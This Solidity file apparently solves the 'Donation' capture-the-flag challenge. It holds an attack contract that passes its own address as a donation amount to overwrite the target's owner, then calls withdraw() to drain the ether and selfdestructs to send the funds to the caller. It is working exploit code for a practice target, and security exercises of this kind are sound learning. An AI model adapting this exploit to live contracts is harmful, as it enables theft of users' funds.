///SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface DonationChallenge {
    function donate(uint256 etherAmount) external payable;

    function withdraw() external;
}

contract DonationAttack {
    function attack(address target) external payable {
        uint256 etherAmountArgument = uint256(uint160(address(this))); // to replace owner
        uint256 weiValueToSend = getValueToSend();

        require(msg.value >= weiValueToSend, "send more eth");

        DonationChallenge(target).donate{value: weiValueToSend}(
            etherAmountArgument
        );
        DonationChallenge(target).withdraw();
        selfdestruct(payable(msg.sender));
    }

    function getValueToSend() public view returns (uint256) {
        uint256 etherAmount = uint256(uint160(address(this))); // to replace owner
        uint256 scale = 10**18 * 1 ether;
        return etherAmount / scale;
    }

    receive() external payable {}
}
